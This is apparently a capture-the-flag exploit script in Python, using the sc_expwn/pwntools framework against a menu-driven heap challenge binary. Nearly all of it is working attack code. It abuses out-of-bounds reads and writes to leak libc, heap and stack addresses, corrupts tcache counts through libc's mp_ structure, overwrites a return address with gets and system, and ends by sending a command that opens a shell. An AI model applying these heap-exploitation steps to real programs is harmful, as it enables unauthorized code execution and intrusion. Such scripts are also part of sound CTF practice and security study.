#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './bin/chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':'./bin/ld-linux-x86-64.so.2 --library-path .'.split()+[bin_file], 'aslr':False, 'gdbscript':'set follow-fork-mode parent'}, \
                        local   = {'argv':'./bin/ld-linux-x86-64.so.2 --library-path .'.split()+[bin_file]}, \
                        remote  = {'host':'localhost', 'port':9007})
env.select()

#==========

binf = ELF(bin_file)

libc = ELF('./bin/libc.so.6')
offset_libc_stdin       = libc.symbols['_IO_2_1_stdin_']
offset_libc_mainarena   = offset_libc_stdin + 0x1e0
offset_libc_mp          = offset_libc_stdin - 0x740

#==========

f2i = lambda f: u64(struct.pack('<d', f))
i2f = lambda i: struct.unpack('<d', p64(i))[0]

def attack(conn, **kwargs):
    ds = Dust(conn)

    '''
    ds.new(0x418//0x10)
    ds.set(4, b'a'*8)
    ds.new(0x18//0x10)
    ds.get(0)

    ds.set_oob(4, float)
    ds.new(0x3f8//0x10)
    ds.get(2)
    '''

    '''
    ds.new(0x18//0x10)
    ds.new(0x418//0x10)
    ds.set(2, b'a'*8)
    ds.new(0x18//0x10)

    ds.set_oob(4, float)
    ds.new(0x418//0x10)
    '''

    ds.new(0x418//0x10)
    ds.set(0, b'a'*8)
    ds.new(0x38//0x10)

    addr_libc_mainarena = f2i(float(ds.get(0))) - 0x450
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_mp        = libc.address + offset_libc_mp
    addr_libc_gets      = libc.sep_function['gets']
    addr_libc_system    = libc.sep_function['system']

    addr_heap_base = f2i(float(ds.get(1))) - 0x310
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    ds.set(2, i2f(libc.symbols['environ']))
    ds.new(0x3d8//0x10)
    ds.set_oob(-2, bytes)
    ds.new(0x38//0x10)
    addr_stack_environ = u(ds.get(2))
    info('addr_stack        = 0x{:08x}'.format(addr_stack_environ))
    addr_stack_ret = (addr_stack_environ & ~(0x10-1)) - 0x1f0 

    get_ofs_tcache_count =  lambda x : ((x-0x20)//0x10*2+0x010) & ~(0x8-1)

    target_size = (0x330-0x090)//8*0x10+0x20
    info('overwirte tcache(0x{:x})'.format(target_size))

    ds.set_oob(((addr_libc_mp+0x60)-(addr_heap_base+0x320))//0x10, float)
    ds.set_oob((get_ofs_tcache_count(target_size) - 0x320)//0x10, float)
    ds.set(1, i2f(addr_heap_base + 0x740))

    ds.new((target_size-8)//0x10)
    ds.set(0, i2f(addr_stack_ret ^ (addr_heap_base >> 12)))
    ds.set_oob((get_ofs_tcache_count(0x80) - 0x740)//0x10, float)

    conn.sendlineafter(b'> ', b'3')
    payload  = p64(addr_libc_gets)
    payload += p64(addr_libc_system)
    conn.sendlineafter(b'index: ', b'0'.ljust(8, b'\x00') + payload)

    conn.sendline(b'sh;ab')

class Dust:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def new(self, size):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'size: ', str(size).encode())

    def set(self, idx, val):
        is_real = type(val) is float

        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.sendlineafter(b']: ', b'1' if is_real else b'0')
        self.sendlineafter(b'value: ', str(val).encode() if is_real else val)

    def set_oob(self, idx, ty):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.sendlineafter(b']: ', b'1' if ty is float else b'0')

    def get(self, idx):
        self.sendlineafter(b'> ', b'3')
        self.sendlineafter(b'index: ', str(idx).encode())
        val = self.recvuntil(b'\n> ', drop=True)
        self.unrecv(b'> ')
        return val

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
